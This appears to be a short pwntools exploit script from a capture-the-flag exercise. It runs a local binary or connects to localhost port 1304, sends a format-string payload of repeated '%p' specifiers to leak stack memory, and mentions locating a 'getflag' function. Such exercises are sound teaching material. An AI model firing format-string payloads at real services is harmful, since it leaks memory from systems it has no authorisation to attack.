from pwn import *

path = './fmt_str'
# Open local process for debugging
if args.REMOTE:
    p = remote('localhost', 1304)
else:
    p = process(path)
# Open the file as a ELF so that we can extract information
# without hardcoding. e.g. we can resolve the address of getflag
# without opening our debugger (ofc, the address will change if the binary is actually a PIE binary)
e = ELF(path)

payload = '%p ' * 11

p.sendline(payload)

p.interactive()

